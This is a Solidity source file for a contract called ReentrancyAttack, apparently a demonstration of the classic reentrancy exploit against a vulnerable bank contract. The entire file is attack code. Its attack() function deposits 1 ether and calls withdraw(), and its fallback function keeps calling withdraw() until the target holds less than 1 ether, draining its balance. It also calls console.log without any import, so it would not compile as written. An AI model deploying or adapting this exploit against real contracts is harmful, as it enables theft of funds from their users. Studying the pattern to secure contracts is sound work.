// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ReentrancyBank {
    function deposit() external payable;
    function withdraw() external;
}


contract ReentrancyAttack{
    ReentrancyBank public reentrancybank;

    constructor(address _reentrancybankAddress){

        reentrancybank = ReentrancyBank(_reentrancybankAddress);
    }


    fallback() external payable{
        if(address(reentrancybank).balance >= 1 ether){
            console.log("reentering...");
            reentrancybank.withdraw();
        }
    }

    function attack() external payable{
        require(msg.value >= 1 ether);
        reentrancybank.deposit{value: 1 ether}();
        reentrancybank.withdraw();
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}
